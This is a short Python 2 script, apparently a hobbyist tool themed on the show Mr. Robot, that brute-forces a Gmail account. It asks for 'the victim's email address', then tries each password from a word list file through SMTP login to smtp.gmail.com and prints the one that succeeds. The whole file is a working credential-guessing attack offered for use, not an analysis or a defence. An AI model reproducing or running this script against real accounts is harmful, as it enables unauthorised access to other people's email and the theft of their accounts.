#!/usr/bin/env python
# -*- coding: utf-8 -*-
import webbrowser
import httplib
import sys
import os
from socket import *
import re
import getopt

import smtplib



class bcolors:
    OK =   '\033[92m'
    FAIL =    '\033[91m'
    BOLD =    '\033[1m'
    ENDC =     '\033[0m'
    UNDERLINE =   '\033[4m'

# Establecemos conexion con el servidor smtp de gmail	
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print ("                                                    \n\n")
print ("              ,SM@B@B@s                                    ")
print ("             XH,     :GBM                                  ")
print ("           GBr         G;                            @G  :G ")
print ("          sBi                                        92  :@ ")
print ("         rB@                :i,        i:   ,:::     ,   ,G ")
print ("         B@B                @B@G,    S@B@   :, ,ri   B@  ,M ")
print ("         2B@,        ,,     M@,MB9 2B@,GB       :s   @B  ,G ")
print ("          SB@       :srB@G  BB  :B@@r  G@  ,r::,:s   @B  ,M ")
print ("           @B@i        @@2  B@         @B  s:   ,s   @B  ,M ")
print ("            iB@Bs,    ,B@r  @B,        B@  ir,,,is   B@  ,B ")
print ("               sB@B@@9s     :r,::i:i::,ii    i:  ,   i,   , ")
print ("            ,S@B2:,   ,G@i  GB,        G@  :r,,,:r   BG  ,9 ")
print ("           2BB:        2Br  29         29  r,   ,r   M2  ,s ")
print ("           ,2s       ,, rs:  rr  ,;sr,  ;s   ,,   ,   sr   : ")
print ("====================================================================")
print ("                   Autor: Luishino Pericena Choque           ")
print ("                 https://lpericena.blogspot.com/                                   ")
print ("====================================================================")
print bcolors.BOLD + "Welcome to, mr.ebola Email Cracker based - S01E01 11m03s" + bcolors.ENDC
print bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.txt" + bcolors.ENDC



user = raw_input("Enter the victim's email address: ")
passwfile = "psw.txt"
#passwfile = "psw.list"
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print  				  bcolors.UNDERLINE +       "Password Found:   %s"     %  password  +  bcolors.ENDC
		
		break;
	except smtplib.SMTPAuthenticationError:
		print       			      bcolors.FAIL +    "Password Incorrect:   %s" %  password  +   bcolors.ENDC

		
#elpscrk -list pswList.list-add Dylan; June 3rd, Stonehenge
		
		
print user
print password
		
		
		
		